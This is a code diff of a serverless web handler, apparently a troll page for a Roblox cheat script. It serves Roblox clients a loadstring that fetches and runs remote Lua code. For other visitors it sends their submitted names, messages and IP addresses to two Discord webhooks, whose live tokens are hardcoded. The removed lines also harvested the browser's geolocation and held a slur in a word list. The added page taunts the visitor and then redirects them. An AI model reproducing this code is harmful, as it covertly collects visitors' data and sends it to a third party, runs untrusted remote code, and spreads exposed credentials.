@@ -1,155 +1,172 @@
+import fetch from 'node-fetch';
+
+const ipifyUrl = 'https://api.ipify.org?format=json'; // API to get the user's IP address
+
 export default async function handler(req, res) {
   const userAgent = req.headers['user-agent'] || '';
 
+  // Roblox client loading
   if (userAgent.includes('Roblox') || userAgent === '') {
     res.setHeader('Content-Type', 'text/plain');
     res.status(200).send(`
-print("Script loaded!")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub/main/OldFluentFisch.lua"))()
+      print("Script loaded!")
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub/main/OldFluentFisch.lua"))()
     `);
   } else if (req.method === 'POST') {
+    // Handle submitted messages (skid or regular)
     let body = '';
-    req.on('data', chunk => {
+    req.on('data', (chunk) => {
       body += chunk.toString();
     });
     req.on('end', async () => {
+      const data = JSON.parse(body);
+      let name = data.name || 'Unknown';
+      let message = data.message || 'No message';
+
+      // Prevent @everyone and @here pings
+      name = name.replace(/@/g, '@\u200b');
+      message = message.replace(/@/g, '@\u200b');
+
+      // Get IP address using ipify API
+      let ipAddress = 'Unknown IP';
       try {
-        const data = JSON.parse(body);
-        let name = (data.name || 'Unknown').replace(/@/g, '@\u200b');
-        let message = (data.message || 'No message').replace(/@/g, '@\u200b');
-
-        // Limiting message length to 500 characters to avoid excessive payloads
-        if (message.length > 500) {
-          message = message.substring(0, 500);
-        }
-
-        // Send name + message to first webhook
-        const skidWebhook = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
-        await fetch(skidWebhook, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}` })
-        });
-
-        // Send IP info (just example IP since Vercel hides real IPs)
-        const fakeIP = req.headers['x-forwarded-for'] || '0.0.0.0';
-        await fetch('https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: `**IP Address:** ${fakeIP}\n**Name:** ${name}` })
-        });
-
-        // Detect troll message
-        const trollWords = ['troll', 'fuck', 'lmao', 'nigga', 'shit', 'idiot', 'noob'];
-        let isTroll = trollWords.some(word => message.toLowerCase().includes(word));
-
-        if (isTroll) {
-          res.redirect('https://m.youtube.com/watch?v=NjD0H4eBfng&pp=ygUObmFlIG5pKiphIHNvbmc%3D');
-        } else {
-          res.redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
-        }
+        const ipResponse = await fetch(ipifyUrl);
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip || 'Unknown IP';
       } catch (error) {
-        console.error('Error processing request:', error);
-        res.status(500).json({ error: 'Server Error' });
+        console.error('Error fetching IP:', error);
       }
+
+      // Send name and message to the first webhook (skid info)
+      const skidWebhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
+      try {
+        await fetch(skidWebhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}`,
+          }),
+        });
+      } catch (error) {
+        console.error('Error sending skid message:', error);
+      }
+
+      // Send IP address and name to the second webhook (IP info)
+      const ipWebhookUrl = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';
+      try {
+        await fetch(ipWebhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `**IP Address Detected**\n**IP Address:** ${ipAddress}\n**Real Name:** ${name}`,
+          }),
+        });
+      } catch (error) {
+        console.error('Error sending IP data:', error);
+      }
+
+      res.status(200).json({ success: true });
     });
   } else {
+    // If GET request or other type, serve HTML page with loading and song
     res.setHeader('Content-Type', 'text/html');
     res.status(200).send(`
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>WHAT ARE YOU DOING</title>
-<style>
-  body {
-    background: black;
-    color: white;
-    font-family: monospace;
-    text-align: center;
-    margin-top: 100px;
-    overflow-x: hidden;
-  }
-  input, textarea, button {
-    padding: 10px;
-    margin: 10px;
-    font-size: 16px;
-    width: 300px;
-  }
-  #loadingText {
-    margin-top: 20px;
-  }
-</style>
-</head>
-<body>
-<h1>WHAT ARE YOU DOING</h1>
-<p>Type your name and apology:</p>
-<input type="text" id="nameBox" placeholder="Your Name"><br>
-<textarea id="messageBox" rows="4" placeholder="I'm sorry..."></textarea><br>
-<button onclick="sendMessage()">Send</button>
-<div id="loadingText"></div>
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <title>What Are You Doing</title>
+        <style>
+          body {
+            background-color: black;
+            color: white;
+            font-family: monospace;
+            text-align: center;
+            margin-top: 100px;
+          }
+          #loading-bar {
+            width: 0;
+            height: 30px;
+            background-color: red;
+            margin-top: 20px;
+            transition: width 3s ease-in-out;
+          }
+          #loading-text {
+            font-size: 24px;
+            margin-top: 20px;
+          }
+          audio {
+            display: none;
+          }
+          h1 {
+            font-size: 50px;
+            color: yellow;
+          }
+          .troll-text {
+            font-size: 20px;
+            color: green;
+            margin-top: 30px;
+            text-shadow: 2px 2px 5px red;
+          }
+        </style>
+      </head>
+      <body>
+        <h1>What Are You Doing</h1>
+        <div id="loading-bar"></div>
+        <div id="loading-text">Loading... Please wait!</div>
+        <div class="troll-text" id="troll-text">You thought you were going to get something cool...</div>
 
-<script>
-const sadSound = new Audio('https://www.myinstants.com/media/sounds/sad-trombone.mp3');
+        <audio id="song" autoplay loop>
+          <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3">
+        </audio>
 
-async function sendMessage() {
-  const name = document.getElementById('nameBox').value.trim();
-  const message = document.getElementById('messageBox').value.trim();
-  const loadingText = document.getElementById('loadingText');
+        <script>
+          // Simulate a crazy loading bar with random breaks
+          function fakeLoadingBar() {
+            const loadingBar = document.getElementById('loading-bar');
+            const loadingText = document.getElementById('loading-text');
+            const trollText = document.getElementById('troll-text');
+            let fakeProgress = 0;
+            let randomDelay = 1000;
 
-  if (!name || !message) {
-    alert('Please fill all fields!');
-    return;
-  }
+            function randomizeProgress() {
+              const randomTime = Math.random() * 2000 + 1000; // Randomized loading time
+              fakeProgress = Math.min(fakeProgress + Math.random() * 20, 100); // Increase progress
+              loadingBar.style.width = fakeProgress + '%';
+              if (fakeProgress >= 50 && fakeProgress < 100) {
+                loadingText.innerText = 'Loading... Almost there!';
+              }
 
-  loadingText.innerText = 'Verifying apology...';
-  await delay(1000);
-  loadingText.innerText = 'Checking sincerity...';
-  await delay(1000);
-  loadingText.innerText = 'Analyzing emotions...';
-  await delay(1000);
-  loadingText.innerText = 'Apology FAILED!';
+              if (fakeProgress < 100) {
+                setTimeout(randomizeProgress, randomTime); // Continue loading
+              } else {
+                loadingText.innerText = 'Done loading! Redirecting you...';
+                setTimeout(() => {
+                  window.location.href = "https://m.youtube.com/watch?v=NjD0H4eBfng&pp=ygUObmFlIG5pKiphIHNvbmc%3D"; // Rickroll URL
+                }, 1000); // Redirect after 1 second
+              }
+            }
 
-  sadSound.play();
-  shakeScreen();
-  await delay(2000);
+            randomizeProgress();
 
-  let geoLocation = { latitude: 'Not available', longitude: 'Not available' };
-  if (navigator.geolocation) {
-    try {
-      const pos = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject);
-      });
-      geoLocation.latitude = pos.coords.latitude;
-      geoLocation.longitude = pos.coords.longitude;
-    } catch (e) {}
-  }
+            // Update troll text every 3 seconds
+            setInterval(() => {
+              const trollMessages = [
+                "You can't escape!",
+                "This is where the fun begins...",
+                "I'm watching you!",
+                "This isn't over!",
+                "Get ready for the surprise!"
+              ];
+              trollText.innerText = trollMessages[Math.floor(Math.random() * trollMessages.length)];
+            }, 3000);
+          }
 
-  fetch(window.location.pathname, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ name: name, message: message, geoLocation: geoLocation })
-  });
-}
-
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-function shakeScreen() {
-  let x = 0;
-  const interval = setInterval(() => {
-    document.body.style.transform = `translate(${(Math.random() * 20 - 10)}px, ${(Math.random() * 20 - 10)}px)`;
-    x++;
-    if (x > 15) {
-      clearInterval(interval);
-      document.body.style.transform = 'translate(0px, 0px)';
-    }
-  }, 50);
-}
-</script>
-</body>
-</html>
+          // Call fake loading bar function
+          fakeLoadingBar();
+        </script>
+      </body>
+      </html>
     `);
   }
 }
